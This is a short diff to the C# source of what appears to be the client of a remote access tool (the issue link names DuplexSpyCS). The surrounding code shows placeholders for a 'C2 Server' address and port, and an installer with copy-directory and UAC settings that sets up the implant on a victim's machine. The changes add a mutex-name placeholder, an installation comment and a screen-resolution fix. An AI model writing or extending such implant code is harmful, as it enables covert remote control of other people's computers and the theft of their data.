@@ -152,6 +152,9 @@ namespace winClient48
 
         #region Configuration
 
+        //Mutex
+        private string m_szMutexName = "[MUTEX_NAME]";
+
         //SOCKET CONNECTION
         private string ip = "[IP]";                          //C2 Server
         private int port = int.Parse("[PORT]");              //Port
@@ -3447,6 +3450,7 @@ namespace winClient48
         {
             try
             {
+                // Installation
                 installer = new clsInstaller();
                 installer.m_szCurrentPath = Process.GetCurrentProcess().MainModule.FileName;
                 installer.m_bCopyDir = m_bCopyDir;
@@ -3458,6 +3462,10 @@ namespace winClient48
                 installer.m_bUAC = m_bUAC;
 
                 installer.Start();
+
+                // Fix resolution 
+                // Source: https://github.com/iss4cf0ng/DuplexSpyCS/issues/16
+                WinAPI.SetProcessDPIAware();
 
                 /*
                 string[] id_array = Global.WMI_QueryNoEncode("select serialnumber from win32_diskdrive");
